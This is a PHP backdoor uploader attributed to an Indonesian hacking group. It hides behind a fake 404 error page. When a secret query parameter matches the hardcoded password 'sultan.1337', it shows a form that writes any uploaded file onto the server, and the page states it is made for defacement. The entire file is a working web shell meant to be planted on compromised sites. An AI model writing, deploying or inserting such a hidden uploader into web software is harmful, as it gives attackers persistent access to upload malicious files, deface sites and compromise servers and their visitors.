 <?php

///////////////////////////////////////////////////////////

// Priv8 Hidden Uploader By Raymond7

// ex : localhost/sultanz.php?lisa=sultan.1337
	
// Garuda Security Hacker - PrianganSec - Jakarta BlackHat

///////////////////////////////////////////////////////////

echo" <title>404 Not Found</title>

</head><body>

<h1>Not Found</h1>

<p>The requested URL ".$_SERVER['REQUEST_URI']." was not found on this server.</p>

<p>Additionally, a 404 Not Found

error was encountered while trying to use an ErrorDocument to handle the request.</p>

</body>";

/////////////////////////////////////////////////////////////////////

$password ="sultan.1337"; // Your Password

/////////////////////////////////////////////////////////////////////

if($_GET['lisa']==$password){

/*

Fixed Bug anything sir ? #1

*/

if(isset($_POST['uploaded']))

{

$file = $_FILES['files']['name'];

$files= $_FILES['files']['tmp_name'];

$folder="";

if(move_uploaded_file($files,$folder.$file))

{

$result = "Uploaded :<a href='$file' target='_blank()'>=> Click Ur File ^_^ </A>";

}

else

{

$result = "Fail -_- Try...";

}

}

echo'

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">

<head>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Changa">
<title> Indonesian BlackHat </title>

</head>';

echo'

<head>

</head>

<body>

<center>

<table width=100% height=100%>
<td align=center> <body bgcolor="black">

<br>

<br>

<img src="http://palmaserasih.co.id/images/lisa.png" width="250" height="270"> 

<br>

<br>

<font face="Changa"><font size="3" color=#ff0000>Garuda Security Hacker - PrianganSec</font>

<br>

<font face="Changa"><font size="2" color=white><\> Coded By Raymond7 <\></font>

<br>

<font face="Changa"><font size="2" color=white> note: Coded script is made to be used for deface </font>

<br>

<br>

<form action="" method="post" enctype="multipart/form-data">

<input type="file" name="files" />

<input type="submit" name="uploaded" value="upload">

</form>

'.$result.'

<br>

<font face="Changa"><font size="2" color=white> sultanpierr0t.1337@gmail.com - Indonesian Hacker Rulez </font>

</center>

</body>

</html>';

}

?>    